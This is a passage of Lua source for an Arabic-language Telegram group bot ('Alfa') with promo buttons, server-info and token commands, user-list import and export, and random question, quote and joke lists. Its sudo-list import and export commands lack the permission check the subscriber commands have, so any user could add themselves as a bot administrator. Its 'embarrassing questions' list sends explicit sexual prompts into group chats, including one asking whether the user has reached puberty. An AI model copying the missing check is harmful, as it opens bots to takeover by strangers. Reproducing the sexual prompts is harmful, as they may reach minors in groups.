{text = 'ᴅᴇᴠ ᴍᴀᴅɪsᴏɴ', url = "https://t.me/AAHMEED11"},{text = 'ᴅᴇᴠ ᴋᴀᴍᴀʟ', url = "https://t.me/W_H_U"},
},
{
{text = 'ᴄʜᴀɴɴᴇʟ ᴀʟғᴀ', url = "https://t.me/so_alfaa"},{text = 'ғᴀᴄᴛᴏʀʏ ᴀʟғᴀ', url = "https://t.me/A_L_VV_BOT"},
},
{
{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/MADI_PICK/20?single&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'قناه السورس' or text == 'قناه السورس' or text == 'قناه السورس' or text == '"' then
local Text =[[
[𝐂𝐡](t.me/so_alfaa)
]]
keyboard = {} 
keyboard.inline_keyboard = {

{
{text = '𝐒𝐨𝐮𝐫𝐜𝐞 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐞𝐫𝐬', url = "https://t.me/USERR_ALFA"},
},
{
{text = '𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐀𝐥𝐟𝐚', url = "https://t.me/so_alfaa"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/so_alfaa&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == '•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•' or text == '•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•' or text == '•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•' or text == '"' then
local Text =[[
من أحسن السورسات على التليجرام سورس الفا
بجد سورس أمان جدا وفي مميزات جامده
تع نصب بوتك عندنا لو محظور
خش على تواصل هيدخلك لروم التواصل
]]
keyboard = {} 
keyboard.inline_keyboard = {

{
{text = '𝐒𝐨𝐮𝐫𝐜𝐞 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐞𝐫𝐬', url = "https://t.me/USERR_ALFA"},
},
{
{text = '𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐀𝐥𝐟𝐚', url = "https://t.me/so_alfaa"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/so_alfaa&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'بوت مين' or text == '"' then
local Text =[[


𖤛- [اهلا بك في سورس الفا الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني ](t.me/so_alfaa) 𖤛


]]
keyboard = {} 
keyboard.inline_keyboard = {

{
{text = '𝐃𝐞𝐯 𝐌𝐚𝐝𝐢𝐬𝐨𝐧', url = "https://t.me/AAHMEED11"},
},
{
{text = '𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐀𝐥𝐟𝐚', url = "https://t.me/so_alfaa"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/so_alfaa&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == "توكن البوت" and SudoBot(msg) or text == "جلب التوكن" and SudoBot(msg) then 
if not DevSoFi(msg) then
send(msg.chat_id_, msg.id_,'هذا الامر خاص بمطور البوت')
return false
end
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.sender_user_id_ .. '&text=' ..token) 
send(msg.chat_id_, msg.id_,' ') 
end

if text == "ماديسون" then
local TEXT_SUD = database:get(bot_id..'Tshake:TEXT_SUDO')
if TEXT_SUDO then 
send(msg.chat_id_, msg.id_,TEXT_SUDO)
else
tdcli_function ({ID = "GetUser",user_id_ =  1208165035,},function(arg,result) 
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = 'للتواصل مع ماديسون مبرمج السورس اتبع الازرار ♡\n['..result.first_name_..'](t.me/AAHMEED11)\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '  ❨  '..result.first_name_..'  ❩ ',url="t.me/"..result.username_},
},
{
{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Name)..'&photo='..taha.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
 end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ =  1208165035, offset_ = 0, limit_ = 1 }, taha, nil)
end,nil)
end
end

if text == "كمال" then
local TEXT_SUD = database:get(bot_id..'Tshake:TEXT_SUDO')
if TEXT_SUDO then 
send(msg.chat_id_, msg.id_,TEXT_SUDO)
else
tdcli_function ({ID = "GetUser",user_id_ =  1744308503,},function(arg,result) 
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = 'للتواصل مع كمال مبرمج السورس اتبع الازرار ♡\n['..result.first_name_..'](t.me/W_H_U)\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '  ❨  '..result.first_name_..'  ❩ ',url="t.me/"..result.username_},
},
{
{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Name)..'&photo='..taha.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
 end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ =  1744308503, offset_ = 0, limit_ = 1 }, taha, nil)
end,nil)
end
end

if text == "نينينينينينينينينيؤ" then
local TEXT_SUD = database:get(bot_id..'Tshake:TEXT_SUDO')
if TEXT_SUDO then 
send(msg.chat_id_, msg.id_,TEXT_SUDO)
else
tdcli_function ({ID = "GetUser",user_id_ =  70,},function(arg,result) 
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = 'للتواصل مع بندا مطور السورس اتبع الازرار الاتيه ♡\n['..result.first_name_..'](t.me/uu_1_p)\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '  ❨  '..result.first_name_..'  ❩ ',url="t.me/"..result.username_},
},
{
{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Name)..'&photo='..taha.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
 end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ =  70, offset_ = 0, limit_ = 1 }, taha, nil)
end,nil)
end
end

if text == 'المبرمج ماديسون' or text == 'ماديسون مبرمج السورس' or text == 'احمد ماديسون' then
local Text = [[
◉ يمكنك التواصل معي..↑↓
◉ عن طريق معرفي بلاسفل..↑↓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐃𝐞𝐯 𝐌𝐚𝐝𝐢𝐬𝐨𝐧 ◉',url="t.me/AAHMEED11"}},
{{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AAHMEED11&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == "هيهي" then
local TEXT_SUD = database:get(bot_id..'Tshake:TEXT_SUDO')
if TEXT_SUDO then 
send(msg.chat_id_, msg.id_,TEXT_SUDO)
else
tdcli_function ({ID = "GetUser",user_id_ = 1208165035,},function(arg,result) 
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = 'ماديسون  الهكر للتواصل معه اتبع الازرارا ⇧\n['..result.first_name_..'](t.me/BelalElshayal)\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𝐁𝐄𝐋𝐀𝐋 🇦🇮',url="t.me/BelalElshayal"},
},
{
{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Name)..'&photo='..taha.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
 end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = 1208165035, offset_ = 0, limit_ = 1 }, taha, nil)
end,nil)
end
end

if text == 'يوتيوب' or text == 'اليوتيوب' or text == 'بوت يوتيوب' or text =='بوت اليوتيوب' then
local Text =[[


افضل بوت بحت يوتيوب علي التليجرام
للدوخل الي البوت اتبع الازرار الاتيه♦️


]]
keyboard = {} 
keyboard.inline_keyboard = {

{
{text = 'بــوت الـيـوتـيـوب', url = "https://t.me/AL_YOUT_BOT"},
},
{
{text = 'قـنـاة الـتـحـديـثـآت', url = "https://t.me/so_alfaa"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AL_YOUT_BOT&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'معلومات السيرفر' and DevSoFi(msg) then 
send(msg.chat_id_, msg.id_, io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '⇗ نظام التشغيل ⇖•\n*←← '"$linux_version"'*' 
echo '╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n◉✔{ الذاكره العشوائيه } ⇎\n*←← '"$memUsedPrc"'*'
echo '╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n◉✔{ وحـده الـتـخـزيـن } ⇎\n*←← '"$HardDisk"'*'
echo '╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n◉✔{ الـمــعــالــج } ⇎\n*←← '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
echo '╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n◉✔{ الــدخــول } ⇎\n*←← '`whoami`'*'
echo '╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n◉✔{ مـده تـشغيـل الـسـيـرفـر }⇎\n*←← '"$uptime"'*'
]]):read('*all'))  
end

if text == 'رفع المشتركين' and DevSoFi(msg) then 
function by_reply(extra, result, success)    
if result.content_.document_ then  
local ID_FILE = result.content_.document_.document_.persistent_id_  
local File_Name = result.content_.document_.file_name_ 
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) )  
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name)  
local info_file = io.open('./users.json', "r"):read('*a') 
local users = JSON.decode(info_file) 
for k,v in pairs(users.users) do 
database:sadd(bot_id..'User_Bot',v)  
end 
send(msg.chat_id_,msg.id_,'تم رفع المشتركين ') 
end    
end 
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil) 
end
if text == 'جلب المشتركين' and DevSoFi(msg) then 
local list = database:smembers(bot_id..'User_Bot') 
local t = '{"users":['   
for k,v in pairs(list) do 
if k == 1 then 
t =  t..'"'..v..'"' 
else 
t =  t..',"'..v..'"' 
end 
end 
t = t..']}' 
local File = io.open('./users.json', "w") 
File:write(t) 
File:close() 
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './users.json', ' عدد المشتركين { '..#list..'}') 
end

if text == 'جلب المطورين' then 
local list = database:smembers(bot_id..'Sudo:User') 
local t = '{"users":['   
for k,v in pairs(list) do 
if k == 1 then 
t =  t..'"'..v..'"' 
else 
t =  t..',"'..v..'"' 
end 
end 
t = t..']}' 
local File = io.open('./sudos3.json', "w") 
File:write(t) 
File:close() 
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './sudos3.json', ' عدد المطورين { '..#list..'}') 
end 
if text == 'رفع المطورين' then 
function by_reply(extra, result, success)    
if result.content_.document_ then  
local ID_FILE = result.content_.document_.document_.persistent_id_  
local File_Name = result.content_.document_.file_name_ 
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) )  
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name)  
local info_file = io.open('./sudos3.json', "r"):read('*a') 
local users = JSON.decode(info_file) 
for k,v in pairs(users.users) do 
database:sadd(bot_id..'Sudo:User',v)  
end 
send(msg.chat_id_,msg.id_,'تم رفع المطورين ') 
end    
end 
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil) 
end
if text == "تويت" or text == "كت تويت" then 
local TWEET_Msg = { 
"اخر افلام شاهدتها", 
"ما هي وظفتك الحياه", 
"اعز اصدقائك ?", 
"اخر اغنية سمعتها ?", 
"تكلم عن نفسك", 
"ليه انت مش سالك", 
"ما هيا عيوب سورس الفا؟ ", 
"اخر كتاب قرآته", 
"روايتك المفضله ?", 
"اخر اكله اكلتها", 
"اخر كتاب قرآته", 
"اي رائيك في الفا..😂 ", 
"افضل يوم ف حياتك", 
"ليه مضيفتش كل جهاتك", 
"حكمتك ف الحياه", 
"لون عيونك", 
"كتابك المفضل", 
"هوايتك المفضله", 
"علاقتك مع اهلك", 
" ما السيء في هذه الحياة ؟ ", 
"أجمل شيء حصل معك خلال هذا الاسبوع ؟ ", 
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس الفا ؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس الفا ؟ ", 
"كم مره حبيت؟ ", 
" اكثر المتابعين عندك باي برنامج؟", 
" نسبه الندم عندك للي وثقت فيهم ؟", 
"تحب ترتبط بكيرفي ولا فلات؟", 
" جربت شعور احد يحبك بس انت مو قادر تحبه؟", 
" تجامل الناس ولا اللي بقلبك على لسانك؟", 
" عمرك ضحيت باشياء لاجل شخص م يسوى ؟", 
"مغني تلاحظ أن صوته يعجب الجميع إلا أنت؟ ", 
" آخر غلطات عمرك؟ ", 
" مسلسل كرتوني له ذكريات جميلة عندك؟ ", 
" ما أكثر تطبيق تقضي وقتك عليه؟ ", 
" أول شيء يخطر في بالك إذا سمعت كلمة نجوم ؟ ", 
" قدوتك من الأجيال السابقة؟ ", 
" أكثر طبع تهتم بأن يتواجد في شريك/ة حياتك؟ ", 
"أكثر حيوان تخاف منه؟ ", 
" ما هي طريقتك في الحصول على الراحة النفسية؟ ", 
" إيموجي يعبّر عن مزاجك الحالي؟ ", 
" أكثر تغيير ترغب أن تغيّره في نفسك؟ ", 
"أكثر شيء أسعدك اليوم؟ ", 
"اي رايك في الدنيا دي ؟ ", 
"ما هو أفضل حافز للشخص؟ ", 
"ما الذي يشغل بالك في الفترة الحالية؟", 
"آخر شيء ندمت عليه؟ ", 
"شاركنا صورة احترافية من تصويرك؟ ", 
"تتابع انمي؟ إذا نعم ما أفضل انمي شاهدته ", 
"يرد عليك متأخر على رسالة مهمة وبكل برود، موقفك؟ ", 
"نصيحه تبدا ب -لا- ؟ ", 
"كتاب أو رواية تقرأها هذه الأيام؟ ", 
"فيلم عالق في ذهنك لا تنساه مِن روعته؟ ", 
"يوم لا يمكنك نسيانه؟ ", 
"شعورك الحالي في جملة؟ ", 
"كلمة لشخص بعيد؟ ", 
"صفة يطلقها عليك الشخص المفضّل؟ ", 
"أغنية عالقة في ذهنك هاليومين؟ ", 
"أكلة مستحيل أن تأكلها؟ ", 
"كيف قضيت نهارك؟ ", 
"تصرُّف ماتتحمله؟ ", 
"موقف غير حياتك؟ ", 
"اكثر مشروب تحبه؟ ", 
"القصيدة اللي تأثر فيك؟ ", 
"متى يصبح الصديق غريب ", 
"وين نلقى السعاده برايك؟ ", 
"تاريخ ميلادك؟ ", 
"قهوه و لا شاي؟ ", 
"من محبّين الليل أو الصبح؟ ", 
"حيوانك المفضل؟ ", 
"كلمة غريبة ومعناها؟ ", 
"كم تحتاج من وقت لتثق بشخص؟ ", 
"اشياء نفسك تجربها؟ ", 
"يومك ضاع على؟ ", 
"كل شيء يهون الا ؟ ", 
"اسم ماتحبه ؟ ", 
"وقفة إحترام للي إخترع ؟ ", 
"أقدم شيء محتفظ فيه من صغرك؟ ", 
"كلمات ماتستغني عنها بسوالفك؟ ", 
"وش الحب بنظرك؟ ", 
"حب التملك في شخصِيـتك ولا ؟ ", 
"تخطط للمستقبل ولا ؟ ", 
"موقف محرج ماتنساه ؟ ", 
"من طلاسم لهجتكم ؟ ", 
"اعترف باي حاجه ؟ ", 
"عبّر عن مودك بصوره ؟ ",
"آخر مره ضربت عشره كانت متى ؟", 
"اسم دايم ع بالك ؟ ", 
"اشياء تفتخر انك م سويتها ؟ ", 
" لو بكيفي كان ؟ ", 
"كت تويت ‏| تخيّل لو أنك سترسم شيء وحيد فيصبح حقيقة، ماذا سترسم؟",
"كت تويت | أكثر شيء يُسكِت الطفل برأيك؟",
"كت تويت | الحرية لـ ... ؟",
"كت تويت | قناة الكرتون المفضلة في طفولتك؟",
"كت تويت ‏| كلمة للصُداع؟",
"كت تويت ‏| ما الشيء الذي يُفارقك؟",
"كت تويت | موقف مميز فعلته مع شخص ولا يزال يذكره لك؟",
"كت تويت ‏| أيهما ينتصر، الكبرياء أم الحب؟",
"كت تويت | بعد ١٠ سنين ايش بتكون ؟",
"كت تويت ‏| مِن أغرب وأجمل الأسماء التي مرت عليك؟",
"‏كت تويت | عمرك شلت مصيبة عن شخص برغبتك ؟",
"كت تويت | أكثر سؤال وجِّه إليك مؤخرًا؟",
"‏كت تويت | ما هو الشيء الذي يجعلك تشعر بالخوف؟",
"‏كت تويت | وش يفسد الصداقة؟",
"‏كت تويت | شخص لاترفض له طلبا ؟",
"‏كت تويت | كم مره خسرت شخص تحبه؟.",
"‏كت تويت | كيف تتعامل مع الاشخاص السلبيين ؟",
"‏كت تويت | كلمة تشعر بالخجل اذا قيلت لك؟",
"‏كت تويت | جسمك اكبر من عٌمرك او العكسّ ؟!",
"‏كت تويت |أقوى كذبة مشت عليك ؟",
"‏كت تويت | تتأثر بدموع شخص يبكي قدامك قبل تعرف السبب ؟",
"كت تويت | هل حدث وضحيت من أجل شخصٍ أحببت؟",
"‏كت تويت | أكثر تطبيق تستخدمه مؤخرًا؟",
"‏كت تويت | ‏اكثر شي يرضيك اذا زعلت بدون تفكير ؟",
"‏كت تويت | وش محتاك عشان تكون مبسوط ؟",
"‏كت تويت | مطلبك الوحيد الحين ؟",
"‏كت تويت | هل حدث وشعرت بأنك ارتكبت أحد الذنوب أثناء الصيام؟",
"علاقتك مع اهلك",
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "كتبات" or text == "حكمه" or text == "قصيده" then 
local TWEET_Msg = { 
"‏من ترك أمرهُ لله، أعطاه الله فوق ما يتمنَّاه?? ", 
"‏من علامات جمال المرأة .. بختها المايل ! ",
"‏ انك الجميع و كل من احتل قلبي🫀🤍",
"‏ ‏ لقد تْعَمقتُ بكَ كَثيراً والمِيمُ لام .♥️",
"‏ ‏ممكن اكون اختارت غلط بس والله حبيت بجد🖇️",
"‏ علينا إحياء زَمن الرّسائل الورقيّة وسط هذه الفوضى الالكترونية العَارمة.◉💜",
"‏ يجي اي الصاروخ الصيني ده جمب الصاروخ المصري لما بيلبس العبايه السوده.🤩♥️",
"‏ كُنت أرقّ من أن أتحمّل كُل تلك القَسوة من عَينيك .🍍",
"‏أَكَان عَلَيَّ أَنْ أغْرَس انيابي فِي قَلْبِك لتشعر بِي ؟.",
"‏ : كُلما أتبع قلبي يدلني إليك .",
"‏ : أيا ليت من تَهواه العينُ تلقاهُ .",
"‏ ‏: رغبتي في مُعانقتك عميقة جداً .🥥",
"ويُرهقني أنّي مليء بما لا أستطيع قوله.✨",
"‏ من مراتب التعاسه إطالة الندم ع شيء إنتهى. ◉ ",
"‏ ‏كل العالم يهون بس الدنيا بينا تصفي 💙",
"‏ بعض الاِعتذارات يجب أن تُرفَضّ.",
"‏ ‏تبدأ حياتك محاولاً فهم كل شيء، وتنهيها محاولاً النجاة من كل ما فهمت.",
"‏ إن الأمر ينتهي بِنا إلى أعتياد أي شيء.",
"‏ هل كانت كل الطرق تؤدي إليكِ، أم أنني كنتُ أجعلها كذلك.",
"‏ ‏هَتفضل توآسيهُم وآحد ورآ التآني لكن أنتَ هتتنسي ومحدِش هَيوآسيك.",
"‏ جَبَرَ الله قلوبِكُم ، وقَلبِي .🍫",
"‏ بس لما أنا ببقى فايق، ببقى أبكم له ودان.💖",
"‏ ‏مقدرش عالنسيان ولو طال الزمن 🖤",
"‏ أنا لستُ لأحد ولا احد لي ، أنا إنسان غريب أساعد من يحتاجني واختفي.",
"‏ ‏أحببتك وأنا منطفئ، فما بالك وأنا في كامل توهجي ؟",
"‏ لا تعودني على دفء شمسك، إذا كان في نيتك الغروب .َ",
"‏ وانتهت صداقة الخمس سنوات بموقف.",
"‏ ‏لا تحب أحداً لِدرجة أن تتقبّل أذاه.",
"‏ إنعدام الرّغبة أمام الشّيء الّذي أدمنته ، انتصار.",
"‏ ",
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "انصحني" or text == "انصحنى" or text == "انصح" then 
local TWEET_Msg = { 
"عامل الناس بأخلاقك ولا بأخلاقهم", 
"الجمال يلفت الأنظار لكن الطيبه تلفت القلوب ", 
"الاعتذار عن الأخطاء لا يجرح كرامتك بل يجعلك كبير في نظر الناس ",
"لا ترجي السماحه من بخيل.. فما في البار لظمان ماء",
"لا تحقرون صغيره إن الجبال من الحصي",
"لا تستحي من إعطاء فإن الحرمان أقل منه ", 
"لا تظلم حتى لا تتظلم ",
"لا تقف قصاد الريح ولا تمشي معها ",
"لا تكسب موده التحكم الا بالتعقل",
"لا تمد عينك في يد غيرك ",
"لا تملح الا لمن يستحقاها ويحافظ عليها",
"لا حياه للإنسان بلا نبات",
"لا حياه في الرزق.. ولا شفاعه في الموت",
"كما تدين تدان",
"لا دين لمن لا عهد له ",
"لا سلطان على الدوق فيما يحب أو بكره",
"لا مروه لمن لادين له ",
"لا يدخل الجنه من لايأمن من جازه بوائقه",
"يسروا ولا تعسروا... ويشورا ولا تنفروا",
"يدهم الصدر ما يبني العقل الواسع ",
"أثقل ما يوضع في الميزان يوم القيامة حسن الخلق ",
"أجهل الناس من ترك يقين ما عنده لظن ما عند الناس ",
"أحياناً.. ويصبح الوهم حقيقه ", 
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "باد" or text == "اسئله محرجه" then 
local TWEET_Msg = { 
" لا تحقرون صغيره إن الجبال من الحصي🥵",
" عاوز تنزل ناو ولا لا ?🥵",
" لو جيسكا قالتلك بيو بيو هتوافق ?🥵",
" مين الممثله اللي نفسك تعمل معاها احيه ?🥵",
" لو جاتلك فرصه تمارسي الجنس المخفف راح توافقي او لا ?🥵",
"اخر مرهه غفلت حد وعملت معاه الجولاشه امته ?🥵 ",
" اي اكتر حاجه بتشدك لجسم الجنس الاخر ?🥵",
" بعتي نودز لكام ولد ?🥵",
" عمرك سكسكتي مع ولد ?🥵",
" بتسكسك مع كام بنت ?🥵",
"قبلتي صديقك قبل كدا ?🥵 ",
" عمرك مارست الجنس ?🥵",
" ما رأيك في اللون الاسود حينما ترتديه فتاه بيضاء ?🥵",
" اخر مره قبلت بنت ?🥵",
"اخر مره قبلتي ولد ?🥵 ",
" مشتهي شي ?🥵",
"اخر مره قمت بزياره المواقع الايباحيه ?🥵 ",
"بدك تمارسي العاده السريه من الامام ام الخلف ? 🥵",
"ما المكان المفضل لك في ممارسه الجنس ?🥵 ",
" متي قمت بممارسه العاده السريه اخر مره ?🥵",
" ما لون ملابسك الداخليه المفضل ???",
"ما مقاس البرا التي ترتديها الان ?🥵 ",
" كم مرا نكت بنت ؟🥵",
"اخر مرا دخلت الحمام ؟🥵 ",
"فشخت كام بنت🥵  ",
" بلغت ولا لا 🥵",
" عايز تنيك ولا لا 🥵",
"حابه تفتحي تيزيك🥵  ",
"اخر مره سكستي امته 🥵 ",
"حبه تتناكي من مين🥵 ",

} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "نكته" or text == "نكت" or text == "عايز اضحك" then 
local TWEET_Msg = { 
" مرة واحد مصري دخل سوبر ماركت في الكويت عشان يشتري ولاعة..    راح عشان يحاسب بيقوله الولاعة ديه بكام؟   قاله دينار..  قاله منا عارف ان هي نار بس بكام 😹😹", 
"بنت حبت تشتغل مع رئيس عصابة..   شغلها في غسيل الأموال 😹😹 ", 
"واحد بيشتكي لصاحبه بيقوله أنا مافيش حد بيحبني ولا يفتكرني أبدًا، ومش عارف أعمل إيه.. قاله سهلة.. استلف من الناس فلوس هيسألوا عليك كل يوم! 😹😹",
"ﻣﺮه واﺣﺪ ﻣﺴﻄﻮل ﻣﺎﺷﻰ ﻓﻰ اﻟﺸﺎرع ﻟﻘﻰ مذﻳﻌﻪ ﺑﺘﻘﻮﻟﻪ ﻟﻮ ﺳﻤﺤﺖ ﻓﻴﻦ اﻟﻘﻤﺮ؟    ﻗﺎﻟﻬﺎ اﻫﻮه..   ﻗﺎﻟﺘﻠﻮ ﻣﺒﺮوك ﻛﺴﺒﺖ ﻋﺸﺮﻳﻦ ﺟﻨﻴﻪ..   ﻗﺎﻟﻬﺎ ﻓﻰ واﺣﺪ ﺗﺎﻧﻰ ﻫﻨﺎك اﻫﻮه. 😹😹",
"واحده ست سايقه على الجي بي اس..  قالها انحرفي قليلًا..   قلعت الطرحة. 😹😹 ",
"مرة واحد غبي معاه عربية قديمة جدًا وبيحاول يبيعها وماحدش راضي يشتريها.. راح لصاحبه حكاله المشكلة.. صاحبه قاله عندي لك فكرة جهنمية هاتخليها تتباع الصبح.. أنت تجيب علامة مرسيدس وتحطها عليها. بعد أسبوعين صاحبه شافه صدفة قاله بعت العربية ولا لاء؟ قاله انت  مجنون؟ حد يبيع مرسيدس؟ 😹😹",
"مره واحد بلديتنا كان بيدق مسمار فى الحائط فالمسمار وقع منه فقال له :تعالى ف مجاش, فقال له: تعالي ف مجاش. فراح بلديتنا رامي على المسمار شوية مسمامير وقال: هاتوه. 😹😹",
"واحدة عملت حساب وهمي ودخلت تكلم جوزها منه.. ومبسوطة أوي وبتضحك.. سألوها بتضحكي على إيه؟ قالت لهم أول مرة يقول لي كلام حلو من ساعة ما اتجوزنا. 😹😹",
"بنت حبت تشتغل مع رئيس عصابة..   شغلها في غسيل الأموال 😹😹",
"مره واحد اشترى فراخ..   علشان يربيها فى قفص صدره.😹😹",
"مرة واحد من الفيوم مات..   أهله صوصوا عليه.😹😹",
